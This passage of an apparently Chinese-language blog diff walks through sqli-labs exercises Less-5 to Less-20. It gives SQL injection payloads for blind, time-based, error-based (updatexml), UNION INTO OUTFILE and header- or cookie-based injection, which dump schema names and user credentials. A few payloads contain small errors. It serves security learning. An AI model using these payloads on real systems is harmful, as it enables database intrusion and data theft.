@@ -93,6 +93,218 @@
 <p>即可。</p>
 </li>
 </ul>
+<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>步骤：</p>
+<ul>
+<li><p>输入：45.32.113.109:19539/Less-5/?id=1‘</p>
+<p>得出为单引号注入</p>
+</li>
+<li><p>获取数据库信息：</p>
+<p>列数：?id=1’ ORDER BY 3–+</p>
+<p>数据库长度：?id=1’ AND LENGTH((SELECT database()))=8–+</p>
+</li>
+<li><p>获取数据库名：</p>
+<p>?id=1’ AND LEFT((SELECT database()), 1)=’s’ –+</p>
+<p>?id=1’ AND LEFT((SELECT database()), 8)=’security’ –+</p>
+</li>
+</ul>
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>步骤：</p>
+<ul>
+<li>输入：45.32.113.109:19539/Less-6/?id=1”，得到双引号字符型注入</li>
+<li>同Less-5</li>
+</ul>
+<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>步骤：</p>
+<ul>
+<li><p>发现注入点：45.32.113.109:40819/Less-7/?id=1’)) and 1=2 – 1</p>
+</li>
+<li><p>导出文件注入：</p>
+<ul>
+<li><p>字段数：</p>
+<p>45.32.113.109:40819/Less-7/?id=-1’)) union select 1,2,3 into outfile “C:\ProgramData\MySQL\MySQL Server 5.7\Uploads\1.txt”–+</p>
+</li>
+<li><p>数据库名：</p>
+<p>45.32.113.109:40819/Less-7/<br>?id=-1’)) union select 1,user(),database() into outfile “C:\ProgramData\MySQL\MySQL Server 5.7\Uploads\1.txt”–+</p>
+</li>
+<li><p>表名：</p>
+<p>45.32.113.109:40819/Less-7/?id=-1’)) union select 1,2,table_name from information_schema.tables where table_schema=’security’ into outfile “C:\ProgramData\MySQL\MySQL Server 5.7\Uploads\1.txt”–+</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>步骤</p>
+<ul>
+<li><p>输入：45.32.113.109:19539/Less-8/?id=1‘，后尝试布尔注入</p>
+</li>
+<li><p>判断数据库长度：</p>
+<p>?id=1’ AND LENGTH((SELECT database()))=8–+</p>
+</li>
+<li><p>判断数据库第一位：</p>
+<p>45.32.113.109:40819/Less-8/<br>?id=1’ and (select ascii(substr(database(),1,1)))=115–+</p>
+<p>或</p>
+<p>45.32.113.109:40819/Less-8/</p>
+<p>?id=1’ AND LEFT((SELECT database()), 1)=’s’ –+</p>
+</li>
+<li><p>依次猜表名：</p>
+<p>?id=1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;101–+</p>
+</li>
+<li><p>依次猜列名：</p>
+<p>?id=1’ and (select ascii(substr((select columns_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)))=117–+</p>
+</li>
+</ul>
+<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>步骤：</p>
+<ul>
+<li><p>45.32.113.109:12575/Less-9/?id=1 and sleep(1)–+</p>
+<p>基于 <strong>时间盲注</strong> 的字符型 Sql 注入</p>
+</li>
+<li><p>得出数据库的长度：</p>
+<p>45.32.113.109:12575/Less-9/<br>?id=1’ AND IF(LENGTH(database())=8,sleep(1),1)–+</p>
+</li>
+<li><p>得出数据库第一个字符为’s’:</p>
+<p>?id=1’ AND IF(LEFT((SELECT database()), 1)=’s’,sleep(1),1)–+</p>
+<p>进而得出数据库名：</p>
+<p>?id=1’ AND IF(LEFT((SELECT database()), 8)=’security’,sleep(1),1)–+</p>
+</li>
+</ul>
+<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>步骤：</p>
+<ul>
+<li><p>与Less-9类似</p>
+</li>
+<li><p>将’改为”:</p>
+<p>45.32.113.109:19539/Less-10/<br>?id=1” and if(length(database())&gt;8 ,sleep(5),1) –+</p>
+</li>
+</ul>
+<h4 id="Less-11——基于‘的POST型注入"><a href="#Less-11——基于‘的POST型注入" class="headerlink" title="Less-11——基于‘的POST型注入"></a>Less-11——基于‘的POST型注入</h4><p>步骤：</p>
+<ul>
+<li><p>不知道存在的用户名，post data输入：</p>
+<p>uname=ele’&amp;passwd=pass&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=submit&spm=1001.2101.3001.7020">submit</a>=Submit，报错，可以判断闭合符号是单引号。</p>
+<p>再输入uname=ele’ order by 2#&amp;passwd=pass&amp;submit=Submit，没有报错，即查询结果为两列</p>
+</li>
+<li><p>先查询所有的数据库：uname=ele’ union select group_concat(schema_name),2 from information_schema.schemata#&amp;passwd=pass&amp;submit=Submit</p>
+</li>
+<li><p>再查询数据库的所有表名：uname=ele’ union select group_concat(table_name),2 from information_schema.tables where table_schema=’pikachu’#&amp;passwd=pass&amp;submit=Submit</p>
+</li>
+<li><p>再查询数据库users表的所有列名：uname=ele’ union select group_concat(column_name),2 from information_schema.columns where table_schema=’pikachu’ and table_name=’users’#&amp;passwd=pass&amp;submit=Submit</p>
+</li>
+</ul>
+<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>步骤：</p>
+<ul>
+<li>同Less-11,只是把’改成”)</li>
+</ul>
+<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>步骤：</p>
+<ul>
+<li><p>输入：</p>
+<p>uname=ele’&amp;passwd=pass&amp;submit=Submit，报错得出，闭合为’)</p>
+</li>
+<li><p>输入：</p>
+<p>uname=ele’ order by 2#&amp;passwd=pass&amp;submit=Submit，没有报错，即查询结果为两列</p>
+</li>
+<li><p>获取服务器上所有数据库名称的前31个字符</p>
+<p>uname=ele’) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&amp;passwd=pass&amp;submit=Submit</p>
+</li>
+<li><p>获取服务器上所有数据库的名称：</p>
+<p>ele’) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&amp;passwd=pass&amp;submit=Submit</p>
+</li>
+<li><p>以此类推</p>
+</li>
+</ul>
+<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>步骤：</p>
+<ul>
+<li><p>输入：</p>
+<p>uname=ele”&amp;passwd=pass&amp;submit=Submit</p>
+<p>得到闭合为”</p>
+</li>
+<li><p>与Less-13一样，只是把’)改为”</p>
+<p>如：获取服务器上所有数据库的名称：</p>
+<p>uname=ele” and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&amp;passwd=pass&amp;submit=Submit</p>
+</li>
+<li><p>依次</p>
+</li>
+</ul>
+<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>步骤：</p>
+<ul>
+<li><p>post data输入：</p>
+<p>uname=ele’ or 1=1#&amp;passwd=pass&amp;submit=Submit，登录成功，故闭合为单引号，可用布尔盲注</p>
+</li>
+<li><p>uname=1’ or ascii(left(database(),1))=115#&amp;passwd=1&amp;submit=Submit</p>
+</li>
+<li><p>查数据库：</p>
+<p>uname=1’ or (ascii(substr((select database()) ,1,1))) = 115 #&amp;passwd=’ or 1=1 #&amp;submit=Submit</p>
+<p>依次可查出是security</p>
+</li>
+<li><p>查其他的数据库：</p>
+<p>uname=1’ or (ascii(substr((select schema_name from information_schema.schemata limit 0,1) ,1,1)))=99 #&amp;passwd=’ or 1=1 #&amp;submit=Submit</p>
+</li>
+<li><p>查表名：</p>
+<p>uname=1’ or (ascii(substr((select table_name from information_schema.tables where table_schema=’ctftraining’ limit 0,1) ,1,1)))=102 #&amp;passwd=’ or 1=1 #&amp;submit=Submit</p>
+</li>
+<li><p>查列名：</p>
+<p>uname=1’ or (ascii(substr((select column_name from information_schema.columns where table_name=’flag’ limit 0,1) ,1,1)))=102 #&amp;passwd=’ or 1=1 #&amp;submit=Submit</p>
+</li>
+<li><p>查数据：</p>
+<p>uname=1’ or (ascii(substr((select group_concat(flag) from ctftraining.flag limit 0,1) ,1,1)))=102 #&amp;passwd=’ or 1=1 #&amp;submit=Submit</p>
+</li>
+</ul>
+<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>步骤：</p>
+<ul>
+<li><p>post data输入：</p>
+<p>uname=ele”) or 1=1#&amp;passwd=pass&amp;submit=Submit，登录成功，</p>
+</li>
+<li><p>剩下步骤与Less-15一致</p>
+</li>
+</ul>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><p>步骤：</p>
+<ul>
+<li><p>post data输入：</p>
+<p>uname=admin&amp;passwd=pass’&amp;submit=Submit</p>
+<p>由报错信息可知闭合是单引号</p>
+</li>
+<li><p>获取服务器上所有数据库的名称：</p>
+<p>uname=admin&amp;passwd=1’ and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&amp;submit=Submit</p>
+</li>
+<li><p>依次</p>
+</li>
+</ul>
+<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>步骤：</p>
+<ul>
+<li><p>用正确的用户名和密码（Dumb）进入处理useragent部分，利用updatexml进行注入</p>
+</li>
+<li><p>查询数据库名</p>
+<p>将User-agent后数据改为：’and updatexml(1,concat(0x7e,(database())),0x7e),1)– #</p>
+<p><img src="C:\Users\86131\AppData\Roaming\Typora\typora-user-images\image-20220331222224748.png" alt="image-20220331222224748"></p>
+</li>
+<li><p>查询表名</p>
+<p>‘and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=‘security’)),0x7e),1)– #</p>
+</li>
+<li><p>查询字段名</p>
+<p>‘and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=‘security’ and table_name=‘users’)),0x7e),1)– #</p>
+</li>
+<li><p>查询字段值</p>
+<p>‘and updatexml(1,concat(0x7e,(select * from(select concat_ws(0x7e,id,username,password)from users limit 0,1)a)),0),”,”)– #</p>
+</li>
+</ul>
+<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>步骤：</p>
+<ul>
+<li><p>用正确的用户名和密码（Dumb）进入修改Referer头的内容，利用updatexml进行注入</p>
+</li>
+<li><p>查询数据库名</p>
+<p>将Referer后数据改为：’ or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1) or ‘</p>
+</li>
+<li><p>如Less-18</p>
+</li>
+</ul>
+<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>步骤：</p>
+<ul>
+<li><p>用正确的用户名和密码登录</p>
+</li>
+<li><p>Burpsuite抓到两个request报文，第一个传送用户名和密码，第二个请求登录成功后的新页面，而这个request报文是携带cookie的</p>
+</li>
+<li><p>将携带cookie的报文send to repeater</p>
+</li>
+<li><p>查询数据库名：</p>
+<p>将Cookie后数据改为：uname=admin’ or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1) or ‘</p>
+</li>
+<li><p>依次，同Less-18</p>
+</li>
+</ul>
 
     </div>
 
